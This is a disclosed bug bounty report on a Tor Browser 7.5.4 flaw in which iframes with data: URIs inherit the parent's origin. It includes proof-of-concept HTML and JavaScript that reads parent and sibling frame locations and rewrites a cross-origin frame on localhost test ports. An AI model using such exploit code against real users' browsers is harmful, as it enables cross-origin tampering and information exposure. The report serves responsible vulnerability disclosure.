# Tor Browser: iframe with `data:` uri  has access to parent window

## Report Details
- **Report ID**: 358005
- **URL**: https://hackerone.com/reports/358005
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-05-27T00:30:07.597Z
- **Disclosed**: 2018-06-06T19:56:28.922Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: torproject

## Vulnerability Information
## Version:
7.5.4 (based on Mozilla Firefox 52.8.0)
Tested with standard security slider. However, it's likely to be possible with a higher security level.

## Summary

In Tor Browser iframe with `data:uri` inherits the origin of parent window.
That leads to iframe has access to parent window.

## PoC

### Iframe could access parent window's location

>  iframe-access-parent.html 
```html
<body>
    <script>
        let f = document.body.appendChild(document.createElement('iframe'))
        f.src =
            'data:text/html,' +
            `<script>alert(parent.location)</scrip` + `t>` 
        // should throw "SecurityError...", instead `alert()` works
    </script>
</body>
```

### iframe could access another iframe with src=data uri

> data-uri-access-another-data-uri.html
```html
<body>
    <script>
        let g = document.body.appendChild(document.createElement('iframe'))
        let f = document.body.appendChild(document.createElement('iframe'))

        g.src =
            'data:text/html,' + 'First iframe with data:uri'

        f.src =
            'data:text/html,' +
            `Second iframe with data:uri <script>alert("Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: " + parent.window.frames[0].location.href)</scr` + `ipt>`

    </script>
</body>
```

### data:uri iframe could rewrite content of another cross-origin iframe via data:uri

##### 127.0.0.1:5000/exploit.html

```html
<body>
    <script>
        let g = document.body.appendChild(document.createElement('iframe'))
        let f = document.body.appendChild(document.createElement('iframe'))

        g.src =
            'http://127.0.0.1:5001/5001.html'

        g.onload = () => {
            f.src =
                'data:text/html,' +
                `Second iframe with data:uri 
                <script>
                    if (!parent.window.frames[0][0]) {
                        console.log('This block called in the context of |Second iframe with data:uri|');
                        console.log('If first script sets parent.window.location to some valid value');
                        console.log('it removes parent.window.frames[0][0].location from the DOM');
                        console.log('Tor re-runs script in this cause, but in context of this window');
                        console.log('e.g. window with |Second iframe with data:uri| text');
                    } else {
                        parent.window.frames[0][0].location = "data:text/html,5000 iframe rewrites  5001<script>
                        window.onload = () => {
                            console.log('This block called in the context of |5000 iframe rewrites 5001|');
                            parent.window.location = 'about:blank'
                        }
                        </scr" + "ipt>";
                    }
                    
                </scr` + `ipt>`
        }

    </script>
    <h4>we could rewrite data:uri in crossdomain windows</h4>
</body>
```

##### 127.0.0.1:5001/5001.html
```html
<html>

<body>
    <script>
        let y = document.body.appendChild(document.createElement('iframe'))
        y.src = 'data:text/html,datauri 5001'
    </script>
</body>

</html>
```

The iframe from 5000 port could rewrite an iframe in a different origin, but it doesn't have access to "parent" at 5001 port, so direct UXSS is impossible.

> Also, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts. 

## Expected behavior

### 1. In latest Chrome, Firefox, Safari iframe with `data:` uri has `null` origin and can't access parent window's location.

PoC in Chrome/FF/Safari throws error:

```
SecurityError: Blocked a frame with origin "null" from accessing a frame with origin "http://127.0.0.1:5000".  The frame requesting access has a protocol of "data", the frame being accessed has a protocol of "http". Protocols must match.
```

### 2. iframe can't rewrite another iframe's content via data uri.
Same as in the 1 case.

```
SecurityError: Permission denied to access property "href" on cross-origin object
```

### 3.

FF
```
NS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied
```

Chrome/Safari
```
Unsafe JavaScript attempt to initiate navigation for frame with URL...
SecurityError: The operation is insecure.
```

## Impact

Partial SOP violation. 
Direct UXSS seems impossible, but described behavior opens a wide range of attack scenarios.
1. Any malicious iframe src=`data:uri` could access parent
2. Any malicious iframe src=`data:uri` could rewrite other frames's location (to data:uri too) in DOM using `parent.window.frames`

## Attachments
- data-uri-access-another-data-uri.html
- iframe-access-parent.html
- 5001.html
- exploit.html
